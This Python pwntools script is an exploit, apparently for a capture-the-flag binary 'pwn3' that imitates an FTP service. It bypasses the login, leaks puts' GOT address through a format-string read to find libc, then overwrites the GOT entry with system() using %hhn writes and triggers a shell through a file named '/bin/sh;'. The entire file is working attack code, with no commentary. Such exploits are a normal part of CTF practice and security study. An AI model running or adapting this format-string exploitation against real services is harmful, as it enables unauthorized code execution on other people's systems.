#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['lxterminal', '-e']

p = process('./pwn3')
elf = ELF('./pwn3')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

target = 'sysbdmin'
username = ''
for i in range(len(target)):
	username += chr(ord(target[i]) - 1)
p.recvuntil('er:Rainism):')
p.sendline(username)

def cmd(c):
	p.recvuntil('ftp>')
	p.sendline(c)

def get(name):
	cmd('get')
	p.recvuntil('you want to get:')
	p.sendline(name)

def put(name, content):
	cmd('put')
	p.recvuntil('file you want to upload:')
	p.sendline(name)
	p.recvuntil('ter the content:')
	p.sendline(content)

def dir():
	cmd('dir')

puts_got = elf.got['puts']

#gdb.attach(p)

payload = p32(puts_got) + '%7$s'
put('1', payload)
get('1')
puts_addr = u32(p.recv(8)[4:8])
libc_base = puts_addr - libc.symbols['puts']
info('libc_base = ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']

def overflow():
	payload = ''
	for i in range(4):
		payload += p32(puts_got + i)
	val = system_addr
	prev = len(payload) & 0xFF
	for i in range(4):
		b = (val >> (8 * i)) & 0xFF
		b = (b - prev + 0x100) % 0x100
		if b > 0:
			payload += '%{}c'.format(b)
		payload += '%{}$hhn'.format(7 + i)
		prev += b
	return payload

payload = overflow()
put('/bin/sh;', payload)
get('/bin/sh;')
dir()

p.interactive()

